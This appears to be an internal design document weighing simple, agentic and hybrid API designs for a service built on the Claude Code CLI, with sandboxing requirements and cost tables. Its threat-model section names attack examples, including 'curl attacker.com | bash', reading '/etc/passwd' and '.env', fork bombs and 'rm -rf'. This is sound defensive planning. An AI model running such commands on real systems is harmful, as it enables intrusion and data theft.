# Architectural Analysis: Simple vs Agentic API

## Executive Summary

The Claude Code API Service can operate at three architectural levels:
1. **Simple Completion API** - Text in, text out (minimal)
2. **Full Agentic API** - Task execution with agents/skills/tools (maximal)
3. **Hybrid API** - Both endpoints (recommended)

This document analyzes each option's technical implications, tradeoffs, and implementation complexity.

---

## Option 1: Simple Completion API

### Architecture
```
Client Request
    ↓
POST /v1/chat/completions
    ↓
Worker Pool → claude -p --model X
    ↓
Text Response
```

### API Interface
```json
POST /v1/chat/completions
{
  "model": "auto|haiku|sonnet|opus",
  "messages": [
    {"role": "user", "content": "What is async/await?"}
  ],
  "max_tokens": 1000
}

Response:
{
  "choices": [{
    "message": {"role": "assistant", "content": "..."},
    "finish_reason": "stop"
  }],
  "usage": {"total_tokens": 150}
}
```

### Characteristics
- **Speed**: < 2 seconds typical
- **Cost**: Predictable (token-based)
- **Complexity**: Low
- **Use Cases**: Chatbots, Q&A, text generation, summarization

### Pros
✅ Fast, predictable performance
✅ Simple to implement and maintain
✅ Easy to price and budget
✅ Low security risk
✅ Scales horizontally easily

### Cons
❌ Limited to text completion
❌ Can't leverage Claude Code's power
❌ No file access, no tools, no agents
❌ Competes with direct Claude API (why use this?)
❌ Misses opportunity for differentiation

### When to Choose
- You only need simple LLM completions
- Security is paramount (minimal attack surface)
- You want fastest time to market
- You're building a chatbot/Q&A system

---

## Option 2: Full Agentic Task API

### Architecture
```
Client Task Request
    ↓
POST /v1/task
    ↓
Worker Pool → claude -p --model X
    ↓
Agentic Loop:
  ├─ Read files
  ├─ Run bash commands
  ├─ Spawn agents
  ├─ Invoke skills
  ├─ Multi-turn reasoning
  └─ Generate artifacts
    ↓
Task Result + Execution Log
```

### API Interface
```json
POST /v1/task
{
  "description": "Analyze src/worker_pool.py for race conditions",
  "allow_tools": ["Read", "Grep", "Bash"],
  "allow_agents": ["security-auditor"],
  "allow_skills": ["vulnerability-scanner"],
  "working_directory": "/project/src",
  "timeout": 300,
  "max_cost": 0.50
}

Response:
{
  "result": {
    "summary": "Found 2 potential race conditions...",
    "artifacts": [
      {"type": "report", "path": "/tmp/security-report.md"}
    ]
  },
  "execution_log": [
    {"step": 1, "action": "read_file", "file": "src/worker_pool.py"},
    {"step": 2, "action": "spawn_agent", "agent": "security-auditor"},
    {"step": 3, "action": "generate_report"}
  ],
  "usage": {
    "total_tokens": 15000,
    "total_cost": 0.045,
    "duration_seconds": 45
  }
}
```

### Characteristics
- **Speed**: 30-300 seconds typical (variable)
- **Cost**: Variable (depends on task complexity)
- **Complexity**: High
- **Use Cases**: Code analysis, document generation, automated testing, data processing

### Pros
✅ Leverages full Claude Code capabilities
✅ Truly differentiated from simple APIs
✅ Enables powerful automation
✅ Can replace entire workflows
✅ High value for customers
✅ Justifies premium pricing

### Cons
❌ Complex security model required
❌ Unpredictable execution time
❌ Variable cost (hard to budget)
❌ Requires sandboxing infrastructure
❌ More difficult to scale
❌ Higher implementation effort

### When to Choose
- You want to differentiate from simple LLM APIs
- Your users need complex automation
- You can build robust security/sandboxing
- You're targeting enterprise customers
- You want premium pricing model

---

## Option 3: Hybrid API (Recommended)

### Architecture
```
                    API Gateway
                         |
        ┌────────────────┴────────────────┐
        |                                  |
   Simple Path                        Agentic Path
        |                                  |
POST /v1/chat/completions          POST /v1/task
        |                                  |
    Fast Worker Pool              Sandboxed Worker Pool
        |                                  |
   Text Response                   Task Result + Logs
```

### Tiered Offering

#### Tier 1: Simple Completions
```json
POST /v1/chat/completions
// Fast, cheap, predictable
// Use for: chatbots, Q&A, text generation
```

#### Tier 2: Agentic Tasks
```json
POST /v1/task
// Powerful, variable cost, complex
// Use for: automation, analysis, generation
```

### Implementation Phases

**Phase 1** (Current Roadmap - Wave 1-3):
- Build simple completion API
- Prove worker pool concept
- Get to MVP quickly

**Phase 2** (New Wave 4):
- INIT-011: Agentic Task Executor
- INIT-012: Security & Sandboxing
- INIT-013: Session Persistence
- INIT-014: Permission System

**Phase 3** (Enhancement):
- Advanced features (streaming, webhooks, etc.)
- Agent marketplace
- Custom skill deployment

### Pros
✅ Progressive enhancement strategy
✅ Addresses both simple and complex use cases
✅ Clear pricing tiers
✅ De-risks agentic implementation
✅ Can launch simple API quickly
✅ Adds agentic when ready

### Cons
❌ Maintaining two execution paths
❌ More complex codebase overall
❌ Requires two sets of documentation
❌ Potential confusion for users

### When to Choose
- You want both speed-to-market AND differentiation
- You're willing to build in phases
- You want to de-risk the agentic approach
- You want flexibility in pricing

---

## Technical Deep Dive: Agentic Execution

### How It Works

When an agentic task request arrives:

1. **Request Validation**
   - Check API key permissions
   - Validate allowed tools/agents/skills
   - Check budget constraints

2. **Sandboxed Environment Setup**
   - Create isolated workspace (`/tmp/task-{id}/`)
   - Copy allowed files to workspace
   - Set up permission boundaries

3. **Worker Spawn**
   - Start Claude CLI in agentic mode
   - Inject task description
   - Enable specified tools/agents/skills

4. **Agentic Loop Execution**
   ```
   Claude receives task
   → Plans approach
   → Calls tools (Read, Grep, Bash)
   → Spawns agents if needed
   → Invokes skills if needed
   → Generates artifacts
   → Returns result
   ```

5. **Result Collection**
   - Capture final output
   - Collect execution log
   - Gather generated artifacts
   - Calculate usage/cost

6. **Cleanup**
   - Remove sandboxed workspace
   - Kill worker process
   - Log metrics

### Example Execution Flow

**Task**: "Create a security report for this codebase"

```
1. Claude reads task description
2. Plans approach: "I'll scan for common vulnerabilities"
3. Uses Read tool → reads all .py files
4. Uses Grep tool → searches for SQL injection patterns
5. Spawns security-auditor agent → deep analysis
6. Agent invokes vulnerability-scanner skill → automated scan
7. Uses Write tool → generates security-report.md
8. Returns result with artifacts
```

**Total execution**: 2 minutes, 15k tokens, $0.045

---

## Security Considerations

### Sandboxing Requirements

For agentic API, you MUST implement:

1. **Filesystem Isolation**
   - Chroot or Docker containers
   - Read-only access to project files
   - Write access only to workspace

2. **Network Isolation**
   - No outbound connections (or whitelist only)
   - No access to internal network
   - No localhost access

3. **Process Isolation**
   - Resource limits (CPU, memory)
   - Timeout enforcement
   - Process kill on timeout

4. **Tool Restrictions**
   - Whitelist allowed tools per API key
   - Block dangerous commands (rm -rf, etc.)
   - Rate limiting per tool type

5. **Agent/Skill Permissions**
   - Per-API-key agent whitelist
   - Skill capability restrictions
   - Audit logging for all actions

### Attack Vectors

**Without sandboxing, malicious users could**:
- Read sensitive files (`/etc/passwd`, `.env`)
- Execute arbitrary commands (`curl attacker.com | bash`)
- DoS your system (infinite loops, fork bombs)
- Exfiltrate data via network requests
- Spawn resource-intensive processes

**Mitigation**: Robust sandboxing is NON-NEGOTIABLE for agentic API.

---

## Cost Analysis

### Simple API Costs

| Metric | Value |
|--------|-------|
| Avg request | 500 tokens |
| Cost (Haiku) | $0.000125 |
| Cost (Sonnet) | $0.0015 |
| Requests/month | 100,000 |
| Monthly cost | $12.50 - $150 |

**Pricing**: $0.01 per request (10x markup)

### Agentic API Costs

| Metric | Value |
|--------|-------|
| Avg task | 10,000 tokens |
| Cost (mixed models) | $0.03 - $0.15 |
| Tasks/month | 1,000 |
| Monthly cost | $30 - $150 |

**Pricing**: $0.50 - $5.00 per task (10x markup)

### Revenue Model

**Tier 1**: Simple API
- $20/month for 10,000 requests
- $0.002 per request overage

**Tier 2**: Agentic API
- $200/month for 500 tasks
- $0.50 per task overage

**Enterprise**: Custom pricing

---

## Recommendation

**Choose Option 3: Hybrid API**

**Reasoning**:
1. **De-risked**: Build simple API first (proven concept)
2. **Differentiated**: Add agentic later (unique value)
3. **Flexible**: Users choose based on use case
4. **Scalable**: Clear pricing tiers
5. **Progressive**: Deliver value at each phase

**Next Steps**:
1. Complete Wave 1-3 (simple API foundation)
2. POC agentic executor (validate concept)
3. Design security model (sandboxing approach)
4. Add Wave 4 initiatives (agentic implementation)
5. Launch Tier 2 when ready

---

## Questions for Decision

1. **Market**: Do your target users need automation capabilities?
2. **Security**: Can you commit to robust sandboxing?
3. **Pricing**: Will customers pay premium for agentic tasks?
4. **Timeline**: Can you defer agentic to Wave 4?
5. **Competition**: Do competitors offer agentic capabilities?

**If all answers are YES → Pursue hybrid approach**
**If mostly NO → Stick with simple API**
